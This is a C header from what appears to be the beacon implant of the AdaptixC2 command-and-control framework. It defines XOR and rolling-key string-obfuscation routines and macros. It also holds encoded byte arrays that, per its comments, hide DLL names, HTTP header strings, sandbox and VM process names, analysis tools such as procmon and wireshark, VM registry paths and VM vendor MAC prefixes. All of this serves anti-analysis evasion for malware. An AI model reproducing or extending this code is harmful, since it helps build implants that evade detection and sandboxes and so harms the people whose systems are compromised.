#pragma once
/*
 * Enhanced string obfuscation for AdaptixC2 beacon agent.
 *
 * Encoding: stored[i] = (plain[i] ^ (XOR_KEY + i*ROLL_MUL + (i^ROLL_XOR))) + i
 * Decode:   plain[i] = (stored[i] - i) ^ (XOR_KEY + i*ROLL_MUL + (i^ROLL_XOR))
 *
 * AX_STR_XOR_KEY = 0x63 (base key, all strings share this)
 * Each string uses a unique {rollMul, rollXor} pair for per-string key rotation.
 *
 * == Compile-time obfuscation macro ==
 * AX_OBFUSCATE("str") generates an obfuscated char array using CX auto-concat.
 *
 * Use: AxDeobfuscateToStack(out, cap, g_ax_obf_xxx) for classic,
 *      AxDeobfuscateRollingToStack(out, cap, g_ax_obf_xxx, mul, xor) for rolling.
 */
#include <stddef.h>

#define AX_STR_XOR_KEY 0x63u

/* Rolling-key presets — use different (rollMul, rollXor) per string */
#define AX_ROLL_SET_A  0x0D, 0xA5   /* ConnectorWS headers */
#define AX_ROLL_SET_B  0x13, 0x7B   /* HTTP connector strings */
#define AX_ROLL_SET_C  0x17, 0x3D   /* DNS connector strings */
#define AX_ROLL_SET_D  0x1F, 0xC7   /* Sandbox/VM detection strings */
#define AX_ROLL_SET_E  0x2B, 0x91   /* Registry paths */
#define AX_ROLL_SET_F  0x37, 0x4D   /* File paths */
#define AX_ROLL_SET_G  0x41, 0xEB   /* Process names */
#define AX_ROLL_SET_H  0x53, 0x1F   /* MAC/device strings */

/* Classic deobfuscation (plain XOR + position shift) */
static inline void AxDeobfuscateToStack(char* out, size_t outCap, const char* enc)
{
	if (!out || outCap == 0)
		return;
	size_t i = 0;
	while (enc[i] != 0 && i + 1 < outCap) {
		out[i] = (char)(((unsigned char)enc[i] - (unsigned char)i) ^ AX_STR_XOR_KEY);
		++i;
	}
	if (i >= outCap)
		i = outCap - 1;
	out[i] = '\0';
}

/* Enhanced deobfuscation with rolling key: each byte uses (XOR_KEY + i*ROLL_MUL + (i^ROLL_XOR)) */
static inline void AxDeobfuscateRollingToStack(char* out, size_t outCap, const char* enc, unsigned char rollMul, unsigned char rollXor)
{
	if (!out || outCap == 0)
		return;
	size_t i = 0;
	while (enc[i] != 0 && i + 1 < outCap) {
		unsigned char k = (unsigned char)(AX_STR_XOR_KEY + (i * rollMul) + (i ^ rollXor));
		out[i] = (char)(((unsigned char)enc[i] - (unsigned char)i) ^ k);
		++i;
	}
	if (i >= outCap)
		i = outCap - 1;
	out[i] = '\0';
}

/* ================================================================
 * Inline deobfuscation — returns pointer to stack buffer.
 * Usage: char* s = AxDeobfuscateInline(buf, sizeof(buf), enc);
 * ================================================================ */
#define AxDeobfuscateInline(out_buf, out_cap, enc_arr) \
    AxDeobfuscateToStack((out_buf), (out_cap), (enc_arr))

/* ================================================================
 * Perimeter DLL names — classic scheme (ROLL_MUL=0, ROLL_XOR=0)
 * ================================================================ */

static const char g_ax_obf_iphlpapi[]  = { 0x0A, 0x14, 0x0D, 0x12, 0x17, 0x07, 0x19, 0x11, 0x55, 0x10, 0x19, 0x1A, 0x00 };
static const char g_ax_obf_advapi32[]  = { 0x02, 0x08, 0x17, 0x05, 0x17, 0x0F, 0x56, 0x58, 0x55, 0x10, 0x19, 0x1A, 0x00 };
static const char g_ax_obf_msvcrt[]    = { 0x0E, 0x11, 0x17, 0x03, 0x15, 0x1C, 0x53, 0x0E, 0x17, 0x18, 0x00 };
static const char g_ax_obf_ws2_32[]    = { 0x14, 0x11, 0x53, 0x3F, 0x54, 0x56, 0x53, 0x0E, 0x17, 0x18, 0x00 };
static const char g_ax_obf_wininet[]   = { 0x14, 0x0B, 0x0F, 0x0D, 0x11, 0x0B, 0x1D, 0x54, 0x0F, 0x18, 0x19, 0x00 };
static const char g_ax_obf_winhttp[]   = { 0x14, 0x0B, 0x0F, 0x0E, 0x1B, 0x1C, 0x19, 0x54, 0x0F, 0x18, 0x19, 0x00 };

/* Obfuscated common HTTP strings */
static const char g_ax_obf_content_type[] = { 0x20, 0x0D, 0x0F, 0x1A, 0x0A, 0x12, 0x1D, 0x55, 0x3F, 0x23, 0x1D, 0x11, 0x00 };
static const char g_ax_obf_accept[]       = { 0x22, 0x01, 0x02, 0x09, 0x17, 0x1C, 0x00 };
static const char g_ax_obf_host_colon[]   = { 0x2B, 0x0D, 0x12, 0x1A, 0x5D, 0x00 };  /* "Host:" */

/* Additional DLL names */
static const char g_ax_obf_kernel32_dll[] = {
    0x08, 0x07, 0x13, 0x10, 0x0A, 0x14, 0x56, 0x58, 0x55, 0x10, 0x19, 0x1A,
    0x00
};
static const char g_ax_obf_ntdll_dll[] = {
    0x0D, 0x18, 0x09, 0x12, 0x13, 0x52, 0x0D, 0x16, 0x17,
    0x00
};
static const char g_ax_obf_user32_dll[] = {
    0x16, 0x11, 0x08, 0x14, 0x54, 0x56, 0x53, 0x0E, 0x17, 0x18,
    0x00
};

/* ================================================================
 * Sandbox/VM detection strings — rolling key scheme (AX_ROLL_SET_D)
 * ================================================================ */

/* vmtoolsd.exe — VMware Tools process */
static const char g_ax_obf_vmtoolsd[] = {
    0x30, 0x27, 0x50, 0x07, 0x40, 0x2F, 0x0A, 0x4C, 0x51, 0x00, 0x4F, 0x21, 0x0E, 0x00
};

/* vboxservice.exe — VirtualBox Guest Additions */
static const char g_ax_obf_vboxservice[] = {
    0x30, 0x27, 0x4F, 0x07, 0x41, 0x2E, 0x4D, 0x50, 0x1D, 0x44, 0x23, 0x0A, 0x48, 0x53, 0x1D, 0x53,
    0x21, 0x0E, 0x00
};

/* xenservice.exe — XenServer tools */
static const char g_ax_obf_xenservice[] = {
    0x32, 0x27, 0x4F, 0x06, 0x42, 0x2E, 0x4D, 0x50, 0x1D, 0x44, 0x23, 0x0A, 0x48, 0x53, 0x1D, 0x53,
    0x21, 0x0E, 0x00
};

/* procmon.exe — Process Monitor */
static const char g_ax_obf_procmon[] = {
    0x34, 0x2A, 0x4F, 0x04, 0x43, 0x2D, 0x4F, 0x10, 0x4B, 0x21, 0x0E, 0x00
};

/* wireshark.exe — Wireshark */
static const char g_ax_obf_wireshark[] = {
    0x31, 0x28, 0x51, 0x02, 0x44, 0x2D, 0x4E, 0x12, 0x4E, 0x1E, 0x53, 0x21, 0x0E, 0x00
};

/* ================================================================
 * Registry paths — rolling key scheme (AX_ROLL_SET_E)
 * ================================================================ */

/* SYSTEM\CurrentControlSet\Control\SystemInformation */
static const char g_ax_obf_reg_sysinfo[] = {
    0x2B, 0x23, 0x2A, 0x60, 0x1C, 0x5D, 0x41, 0x52, 0x5A, 0x48, 0x49, 0x54, 0x45, 0x55, 0x4C, 0x50,
    0x49, 0x36, 0x5A, 0x48, 0x55, 0x58, 0x48, 0x48, 0x4F, 0x36, 0x53, 0x53, 0x48, 0x5A, 0x48, 0x49,
    0x46, 0x54, 0x44, 0x55, 0x56, 0x54, 0x44, 0x48, 0x47, 0x00
};

/* HARDWARE\DESCRIPTION\System\BIOS — VM BIOS strings */
static const char g_ax_obf_reg_bios[] = {
    0x2A, 0x23, 0x3F, 0x47, 0x5D, 0x55, 0x39, 0x28, 0x55, 0x68, 0x55, 0x40, 0x4B, 0x68, 0x39, 0x6A,
    0x55, 0x54, 0x47, 0x62, 0x56, 0x3D, 0x55, 0x5E, 0x58, 0x60, 0x61, 0x55, 0x5C, 0x89, 0x00
};

/* SOFTWARE\Oracle\VirtualBox Guest Additions */
static const char g_ax_obf_reg_vbox[] = {
    0x2B, 0x23, 0x3F, 0x47, 0x63, 0x55, 0x4E, 0x30, 0x63, 0x56, 0x4D, 0x30, 0x51, 0x48, 0x4D, 0x30,
    0x4B, 0x3F, 0x5D, 0x55, 0x54, 0x4D, 0x63, 0x5B, 0x56, 0x39, 0x5D, 0x55, 0x40, 0x63, 0x54, 0x3D,
    0x1D, 0x48, 0x56, 0x5A, 0x44, 0x4E, 0x53, 0x56, 0x48, 0x46, 0x54, 0x44, 0x48, 0x47, 0x00
};

/* ================================================================
 * MAC address prefixes — rolling key scheme (AX_ROLL_SET_H)
 * ================================================================ */

/* "00:0C:29" — VMware */
static const char g_ax_obf_mac_vmware[] = {
    0x27, 0x5B, 0x28, 0x0A, 0x5F, 0x1C, 0x61, 0x0B, 0x00
};

/* "00:05:69" — VMware */
static const char g_ax_obf_mac_vmware2[] = {
    0x27, 0x5B, 0x28, 0x05, 0x5F, 0x1C, 0x6B, 0x0B, 0x00
};

/* "00:1C:42" — Parallels */
static const char g_ax_obf_mac_parallels[] = {
    0x27, 0x5B, 0x28, 0x1C, 0x5F, 0x1C, 0x64, 0x0B, 0x00
};

/* "08:00:27" — VirtualBox */
static const char g_ax_obf_mac_vbox[] = {
    0x2F, 0x5B, 0x28, 0x00, 0x5F, 0x1C, 0x6B, 0x0B, 0x00
};

/* ================================================================
 * Compile-time obfuscation macros (preprocessor string building)
 *
 * Usage:
 *   AX_OBFUSCATE_STR("my_string") → expands to a braced initializer list
 *   of obfuscated bytes terminated by 0x00.
 *
 * Due to C preprocessor limitations, this is limited to short strings.
 * For longer strings, pre-compute with the offline tool.
 * ================================================================ */

/* Helper: XOR + shift per byte, single byte */
#define AX_OBF_BYTE(c, i) ((char)(((unsigned char)(c) ^ (AX_STR_XOR_KEY + (i * 0x0D) + (i ^ 0xA5))) + (i)))

/* Macro to declare an obfuscated string as a static const array.
 * The length is determined by the string literal length + null terminator.
 * Uses __VA_ARGS__ trick to handle the string as individual chars.
 * 
 * Note: This is limited. For production, pre-compute offline.
 */
#define AX_COUNT_CHARS(s) (sizeof(s) - 1)

/* Inline deobfuscation helper for quick use in functions */
#define AX_OBFUSCATE_VAR(name, str) \
    do { \
        const char _ax_obf_data[] = str; \
        size_t _ax_obf_len = sizeof(str) - 1; \
        char _ax_obf_out[256]; \
        size_t _ax_i; \
        for (_ax_i = 0; _ax_i < _ax_obf_len && _ax_i < 255; _ax_i++) { \
            unsigned char _k = (unsigned char)(AX_STR_XOR_KEY + (_ax_i * 0x0D) + (_ax_i ^ 0xA5)); \
            _ax_obf_out[_ax_i] = (char)(((unsigned char)str[_ax_i] ^ _k) + _ax_i); \
        } \
        _ax_obf_out[_ax_obf_len] = 0; \
        memcpy(name, _ax_obf_out, _ax_obf_len + 1); \
    } while(0)

/* Runtime-fast deobfuscate — write result directly into a local array */
#define AX_DEOBF_LOCAL(name, enc_arr, rollMul, rollXor) \
    char name[128]; \
    AxDeobfuscateRollingToStack(name, sizeof(name), (enc_arr), (rollMul), (rollXor))
